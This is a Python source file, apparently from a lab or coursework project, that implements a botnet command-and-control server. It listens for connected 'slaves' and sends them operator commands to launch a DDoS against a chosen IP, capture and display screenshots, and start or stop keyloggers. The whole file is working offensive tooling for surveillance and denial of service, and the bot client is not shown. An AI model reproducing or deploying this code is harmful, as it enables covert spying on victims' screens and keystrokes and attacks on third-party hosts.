from signal import SIGTERM
import socket
import ipaddress
from multiprocessing import Process, Manager
from time import sleep, time
from PIL import Image
import os

# COMMAND AND CONTROL CODE WILL GO HERE

port = 1234
ip = '192.168.56.103'

def removeSlave(slaves, ip):
    sleep(30)
    slaves.remove(ip)

def receiveImage(sock):
    sleep(1)
    data = sock.recv(40960000)
    file = open("./screenshot.png", 'wb')
    file.write(data)
    file.close()
    sock.sendall(b"thx")
    

def runServer(sharedArray, slaves):
    slavetimeouts = dict()
    #Create listening socket
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((ip, port))
        print("Bound to " + ip + ":" + str(port))
        s.listen()
        print("Listening")
        while True:
                #Accept connections and send task back
                sres, addr = s.accept()
                data = sres.recv(1024)
                command = bytearray(sharedArray)
                decoded = command.decode('utf-8').split(" ")
                if ((decoded[0] == "screenshot" or 
                    decoded[0] == "startkeylogger" or
                    decoded[0] == "stopkeylogger") 
                    and not decoded[1] == addr[0]):
                    command = b" "
                sres.sendall(command)
                if(len(decoded) == 1 or decoded[1] == addr[0]):
                    sharedArray[:] = " ".encode("utf-8")
                if(decoded[0] == "screenshot" ):
                    if decoded[1] == addr[0]:
                        receiveImage(sres)
                        img = Image.open("screenshot.png")
                        img.show()
                sres.close()
                #Keep list of online slaves
                if slaves.count(addr[0]) == 0:
                    slaves.append(addr[0])
                #Set timeout for removal of slave from list
                if addr[0] in slavetimeouts and slavetimeouts[addr[0]].is_alive():
                    slavetimeouts[addr[0]].terminate()
                slavetimeouts[addr[0]] = Process(target=removeSlave, args=(slaves, addr[0],))
                slavetimeouts[addr[0]].start()
        for key, process in slavetimeouts:
            process.terminate()
                    
#Checks if an ip address is valid 
def isValidIp(address):
    try:
        ip = ipaddress.ip_address(address)
        return True
    except ValueError:
        return False

if __name__ == "__main__":
    #Manager is used to share data between processes
    manager = Manager()
    sharedArray = manager.list()
    sharedArray[:] = b""
    
    slaves = manager.list()
    
    #Run server in seperate process
    p = Process(target=runServer, args=(sharedArray, slaves))
    p.start()
    while True:
        #Wait for command input
        print("Enter a command...")
        command = input().strip()
        currentSplit = command.split(" ")
        #Process command
        if currentSplit[0] == "exit":
            print("Stopping server...")
            break
        elif currentSplit[0] == "ddos":
            if len(currentSplit) < 2 or not isValidIp(currentSplit[1]):
                print("Invalid argument, should give valid ip address")
                sharedArray.value = b""
            else:
                #Convert to bytes for sending to slave
                sharedArray[:] = command.encode('utf-8')
        elif currentSplit[0] == "screenshot":
            if len(currentSplit) < 2 or not slaves.count(currentSplit[1]):
                print("Invalid argument, should give target ip and target ip should be currently connected")
                sharedArray.value = b""
            else:
                sharedArray[:] = command.encode('utf-8')
        elif currentSplit[0] == "startkeylogger":
            if len(currentSplit) < 2 or not slaves.count(currentSplit[1]):
                print("Invalid argument, should give target ip and target ip should be currently connected")
                sharedArray.value = b""
            else:
                sharedArray[:] = command.encode('utf-8')
        elif currentSplit[0] == "stopkeylogger":
            if len(currentSplit) < 2 or not slaves.count(currentSplit[1]):
                print("Invalid argument, should give target ip and target ip should be currently connected")
                sharedArray.value = b""
            else:
                sharedArray[:] = command.encode('utf-8')
        elif currentSplit[0] == "slaves":
            #Print all active slaves
            message = "\033[4mCURRENT SLAVES:\033[0m"
            for slave in slaves:
                message += "\n" + str(slave)
            print(message)
        elif currentSplit[0] == "help":
            print('''
                  ###############################
                   Python Botnet Server Commands
                  ###############################
                  ddos {target ip}: starts a ddos process on all connected slaves that targets the target ip
                  screenshot {slave ip}: takes and shows a screenshot of the slave ip screen
                  startkeylogger {slave ip}: starts a keylogger on the slave ip
                  stopkeylogger {slave ip}: stops a keylogger on the slave ip
                  slaves: shows currently connected slaves
                  exit: stops the server
                  help: shows this message
                  ''')
        else:
            print("Unvalid command")
    p.terminate()